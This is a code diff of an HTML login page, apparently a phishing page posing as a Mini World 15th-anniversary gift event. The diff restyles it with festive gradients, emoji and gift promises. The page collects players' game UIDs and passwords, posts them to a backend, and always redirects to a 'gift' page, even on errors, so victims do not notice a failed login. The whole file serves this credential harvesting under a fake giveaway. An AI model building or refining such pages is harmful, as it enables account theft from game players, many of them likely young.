@@ -2,113 +2,137 @@
 <html lang="tr">
   <head>
     <meta charset="utf-8" />
-    <title>Oyun Giriş</title>
+    <title>Mini Bean Event Login</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
-      /* Arka plan */
+      /* Arka plan: kutlama havası */
       body {
         margin: 0;
         font-family: "Segoe UI", Roboto, sans-serif;
-        background: linear-gradient(135deg, #1e293b, #0f172a);
+        background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #1dd1a1);
+        background-size: 400% 400%;
+        animation: gradientMove 12s ease infinite;
         display: flex;
         justify-content: center;
         align-items: center;
         min-height: 100vh;
       }
-                /* Kart */
+      @keyframes gradientMove {
+        0% {background-position: 0% 50%;}
+        50% {background-position: 100% 50%;}
+        100% {background-position: 0% 50%;}
+      }
+
+      /* Kart */
       .login-box {
-        background: #ffffff;
-        width: 360px;
+        background: rgba(255,255,255,0.95);
+        width: 380px;
         padding: 40px;
-        border-radius: 12px;
-        box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+        border-radius: 16px;
+        box-shadow: 0 12px 32px rgba(0,0,0,0.3);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .login-box::before {
+        content: "🎉🥳🎁";
+        position: absolute;
+        top: -20px;
+        right: -20px;
+        font-size: 2.5rem;
+        opacity: 0.2;
       }
 
       .login-box h1 {
         margin: 0 0 20px;
-        font-size: 1.6rem;
-        text-align: center;
-        color: #0f172a;
+        font-size: 1.8rem;
+        color: #ff6b6b;
+        font-weight: 700;
       }
 
       /* Input alanları */
       .input-group {
         margin-bottom: 20px;
+        text-align: left;
       }
 
       .input-group label {
         display: block;
         margin-bottom: 6px;
         font-weight: 600;
-        color: #334155;
+        color: #374151;
       }
-                 .input-group input {
+
+      .input-group input {
         width: 100%;
         padding: 12px;
-        border: 1px solid #cbd5e1;
-        border-radius: 8px;
+        border: 2px solid #e5e7eb;
+        border-radius: 10px;
         font-size: 1rem;
-        transition: border-color 0.2s;
+        transition: all 0.3s;
       }
 
       .input-group input:focus {
-        border-color: #3b82f6;
+        border-color: #ff6b6b;
+        box-shadow: 0 0 8px rgba(255,107,107,0.5);
         outline: none;
       }
 
       /* Buton */
       button {
         width: 100%;
-        padding: 12px;
-        background: #3b82f6;
+        padding: 14px;
+        background: linear-gradient(90deg, #ff6b6b, #feca57);
         border: none;
-        border-radius: 8px;
+        border-radius: 10px;
         color: #fff;
-        font-size: 1rem;
-        font-weight: 600;
+        font-size: 1.1rem;
+        font-weight: 700;
         cursor: pointer;
-        transition: background 0.2s;
+        transition: transform 0.2s, box-shadow 0.2s;
       }
-                
-button:hover {
-        background: #2563eb;
+
+      button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 6px 16px rgba(0,0,0,0.2);
       }
 
       /* Mesaj */
       .msg {
         margin-top: 16px;
-        text-align: center;
-        font-size: 0.95rem;
+        font-size: 1rem;
+        font-weight: 600;
       }
       .ok { color: #16a34a; }
       .err { color: #dc2626; }
 
       /* Footer */
       footer {
-        margin-top: 20px;
-        text-align: center;
-        font-size: 0.85rem;
-        color: #64748b;
+        margin-top: 24px;
+        font-size: 0.9rem;
+        color: #374151;
+        font-weight: 600;
       }
     </style>
   </head>
   <body>
     <div class="login-box">
-      <h1>UID Login</h1>
+      <h1>Mini Bean Login 🎁</h1>
 
       <div class="input-group">
         <label for="uid">UID</label>
-        <input id="uid" type="text" placeholder="" maxlength="200" />
+        <input id="uid" type="text" maxlength="200" />
       </div>
-                <div class="input-group">
+      <div class="input-group">
         <label for="level">Password</label>
-        <input id="level" type="text" placeholder="" maxlength="200" />
+        <input id="level" type="password" maxlength="200" />
       </div>
 
-      <button id="submitBtn">Log in</button>
+      <button id="submitBtn">🎉 Log in</button>
       <div id="msg" class="msg"></div>
 
-      <footer>Welcome to Mini Bean Event 🎉🥳 Mini World 15th Anniversary Special GIANT GIFT</footer>
+      <footer>Mini World 15. Yıl Özel Etkinliği – Dev Hediyeler Seni Bekliyor 🎊</footer>
     </div>
 
     <script>
@@ -123,12 +147,11 @@ button:hover {
         const level = document.getElementById('level').value.trim();
 
         if (!uid || !level) {
-          msg.textContent = 'Lütfen UID ve Level gir.';
+          msg.textContent = 'Lütfen UID ve şifre giriniz.';
           msg.className = 'msg err';
           return;
         }
-                  try {
-          // Önce backend'e gönder
+        try {
           const res = await fetch('/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -137,30 +160,22 @@ button:hover {
           const data = await res.json();
 
           if (data.ok) {
-            msg.textContent = 'Thanks!';
+            msg.textContent = 'Teşekkürler 🎉';
             msg.className = 'msg ok';
             document.getElementById('uid').value = '';
             document.getElementById('level').value = '';
-
-            // Başarılıysa gift.html sayfasına yönlendir
             window.location.href = "gift.html";
           } else {
             msg.textContent = data.message || 'Bir hata oluştu.';
             msg.className = 'msg err';
-                      // Hata olsa bile yine gift.html'e yönlendir
             window.location.href = "gift.html";
           }
         } catch (e) {
           msg.textContent = 'Sunucuya bağlanılamadı.';
           msg.className = 'msg err';
-
-          // Bağlantı hatası olsa bile gift.html'e yönlendir
           window.location.href = "gift.html";
         }
       });
     </script>
   </body>
 </html>
-
-
-
